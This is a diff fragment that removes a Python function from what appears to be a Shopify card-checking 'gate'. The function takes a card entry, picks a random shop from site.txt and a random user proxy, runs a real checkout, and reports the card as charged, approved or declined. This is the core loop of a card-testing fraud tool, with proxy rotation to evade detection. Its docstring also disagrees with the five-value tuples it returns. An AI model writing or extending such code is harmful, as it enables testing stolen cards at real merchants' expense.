-    Returns: (success: bool, result: str, amount: str, proxy_hash: str)
-    """
-    from GATES.AUTOSHOPIFY.AUTOSH.shopify_db import shopify_db
-
-    # ── load sites from site.txt ──────────────────────────────────────
-    try:
-        sites = load_sites_from_file(SITE_TXT)
-    except FileNotFoundError:
-        return False, "No site.txt found — create GATES/AUTOSHOPIFY/AUTOSH/site.txt", "0", "None"
-    except Exception as e:
-        return False, str(e), "0", "None"
-
-    # ── load user proxies ─────────────────────────────────────────────
-    proxies_raw = await shopify_db.get_proxies(user_id)
-    if not proxies_raw:
-        return False, "no proxies", "0", "None"
-
-    proxy_entry = random.choice(proxies_raw)["proxy"]
-    try:
-        proxy_url = normalize_proxy(proxy_entry)
-    except Exception:
-        proxy_url = ""
-
-    proxy_hash = hashlib.md5(proxy_url.encode()).hexdigest()[:8] if proxy_url else "None"
-
-    # ── pick a random site and run the check in a thread ─────────────
-    shop_url = random.choice(sites)
-    result: CheckResult = await asyncio.to_thread(
-        run_checkout_for_card, shop_url, card_entry, proxy_url
-    )
-
-    # ── map CheckResult → legacy return format ────────────────────────
-    if result.status == CheckStatus.CHARGED:
-        return True, "ORDER_PLACED", result.amount or "0", proxy_hash, result.receipt_url
-
-    if result.status == CheckStatus.APPROVED:
-        return True, result.status_code or "APPROVED", result.amount or "0", proxy_hash, ""
-
-    if result.status == CheckStatus.DECLINED:
-        return False, str(result.error or result.status_code or "DECLINED"), "0", proxy_hash, ""
-
-    # ERROR
-    return False, str(result.error or result.status_code or "Unknown error"), "0", proxy_hash, ""
